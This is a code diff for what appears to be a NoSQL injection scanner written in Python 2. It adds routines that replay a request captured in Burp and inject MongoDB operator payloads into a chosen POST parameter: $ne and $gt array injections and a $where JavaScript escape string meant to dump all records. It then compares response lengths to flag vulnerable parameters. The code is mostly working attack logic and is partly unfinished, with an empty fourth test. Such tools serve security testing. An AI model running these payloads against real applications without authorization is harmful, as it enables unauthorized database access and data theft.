@@ -55,7 +55,12 @@ def postWeb(reqFile):
 	possAddrs = []
 	global validAddrs
 	validAddrs = []
-	addedTargetUrls = set() 
+	global addedTarget
+	addedTarget = dict()
+	global paramNames
+	paramNames = []
+	global paramValues
+	paramValues = []
 	appUp = False
 	strAttack = False
 	intAttack = False
@@ -68,6 +73,112 @@ def postWeb(reqFile):
 		printErrMsg('[Error] Something went wrong while trying to read the content of file \'%s\'' % reqFile)
 		return
 	parseBurpLog(content)
+	if not addedTarget['url'] or not addedTarget['data']:
+		printErrMsg('[Error] Unable to find usable request(s), in provided file (\'%s\')' % reqFile)
+		return
+
+	print '[*] Testing connection to the target URL.'
+	url = addedTarget['url']
+	injectPostParams(url,addedTarget['data'])
+
+
+
+def injectPostParams(url,data):
+	postParams = dict()
+	injectName = []
+	postData = data
+	global testNum
+	testNum = 1
+	
+
+	params = postData.split('&')
+	for item in params:
+		index = item.find('=')
+		postParams[item[0:index]] = item[index+1:len(item)]
+		#injectParams[item[0:index]] = item[index+1:len(item)]
+	try:
+		req = requests.post(url,data=postParams,headers=HEADERS)
+		if req.status_code == 200:
+			appUp = True
+			resLength = int(len(req.content))
+			print '[*] App is up, got response length of %s' % resLength
+		else:
+			printErrMsg('[Error] Got %s from the app, check your options.' % req.status_code)
+			return
+
+	except Exception, e:
+		printErrMsg('[Error] %s. Looks like the server didn\'t respond.  Check your options.' % e)
+		return
+	if appUp == True:
+		index = 1
+		print '[+] List of post params:'
+		for params in postParams:
+			print '    [%s] %s' % (index, params)
+			index += 1
+		try:
+			injectIndex = getQuesMsg('Choose a parmeter to inject: ')
+			injOpt = postParams.keys()[int(injectIndex)-1]
+		except Exception, e:
+			printErrMsg('[Error] %s. Somthing wrong... Check inject parmeters.' % e)
+			return
+		injectSize = getQuesMsg('[*] Input test random string size: ')
+		injectstr = getInjectStr(int(injectSize))
+		postParams[injOpt] = injectstr
+
+		req = requests.post(url,data=postParams,headers=HEADERS)
+		basedInjectLength = int(len(req.content))
+		print '[*] Got response length of %s.' % basedInjectLength
+
+		LengthDelta = abs(resLength - basedInjectLength)
+		if LengthDelta == 0:
+			print '[*] No change in response size injecting a random parameter..'
+
+		#Test 1 Generate not equals injection
+		neDict = postParams
+		neDict[injOpt+'[$ne]'] = neDict[injOpt]
+		del neDict[injOpt]
+		req = requests.post(url, data=neDict, headers=HEADERS)
+		print '[*] Testing Mongo PHP not equals associative array injection...'
+		errorCheck = errorTest(req.content,testNum)
+
+		if errorCheck == False:
+			injLen = int(len(req.content))
+			checkResult(basedInjectLength,injLen,testNum,postParams)
+			testNum += 1
+		else:
+			testNum += 1
+
+		# Test 2 generate $gt injection
+		gtDict = postParams
+		gtDict.update({injOpt:''})
+		gtDict[injOpt+'[$gt]'] = gtDict[injOpt]
+		del gtDict[injOpt]
+		req = requests.post(url,data=gtDict,headers=HEADERS)
+		print '[*] Testing PHP/ExpressJS >Undefined Injection...'
+		errorCheck = errorTest(req.content,testNum)
+
+		if errorCheck == False:
+			injLen = int(len(req.content))
+			checkResult(basedInjectLength,injLen,testNum,postParams)
+			testNum += 1
+
+		#Test 3
+		postParams.update({injOpt:"a'; return db.a.find(); var dummy='!"})
+		req = requests.post(url,data=postParams,headers=HEADERS)
+		print '[*] Testing Mongo <2.4 $where all Javascript string escape attack for all records...'
+		errorCheck = errorTest(req.content,testNum)
+
+		if errorCheck == False:
+			injLen = int(len(req.content))
+			checkResult(basedInjectLength,injLen,testNum,postParams)
+			testNum += 1
+		else:
+			testNum += 1
+
+		#Test 4
+
+	
+
 
 
 def getWeb(url):
@@ -298,7 +409,15 @@ def errorTest(errorcheck, testNum):
 			possAddrs.append(urlArray[testNum])
 			return True
 		else:
-			pass
+			if testNum == 1:
+				possAddrs.append(str(neDict))
+				return True
+			elif testNum == 2:
+				possAddrs.append(str(gtDict))
+				return True
+			else:
+				possAddrs.append(str(postParams))
+				return True
 	else:
 		return False
 
@@ -393,7 +512,7 @@ def buildUrl(url, value):
 
 	try:
 		injectIndex = getQuesMsg('[*] Choose parmeters to inject (such as 1,2,3):')
-		print injectIndex.split(',')
+		#print injectIndex.split(',')
 		for i in injectIndex.split(','):
 			injectParams.append(paramNames[int(i)-1])
 	except Exception, e:
@@ -507,9 +626,7 @@ def parseBurpLog(content):
 			scheme = schemePort.group(1)
 			port = schemePort.group(2)
 		else:
-			scheme, port = None, None
-		print scheme, port 
-
+			scheme, port = None, None 
 		if not re.search(r"^[\n]*(%s).*?\sHTTP\/" % "|".join(getPublicTypeMembers(HTTPMETHOD, True)), request, re.I | re.M):
 			continue
 		if re.search(r"^[\n]*%s.*?\.(%s)\sHTTP\/" % ('GET', "|".join(CRAWL_EXCLUDE_EXTENSIONS)), request, re.I | re.M):
@@ -583,7 +700,9 @@ def parseBurpLog(content):
 			if not url.startswith("http"):
 				url = "%s://%s:%s%s" % (scheme or "http", host, port or "80", url)
 				scheme, port = None, None 
-			if not(None and not re.search(conf.scope, url, re.I)):
-				print url, method, cookie, tuple(headers)
-				print '---'*10
-				print data
+			if not(None and not re.search(None, url, re.I)):
+				addedTarget['data'] = data
+				addedTarget['cookie'] = cookie
+				addedTarget['method'] = method
+				addedTarget['headers'] = tuple(headers)
+				addedTarget['url'] = url
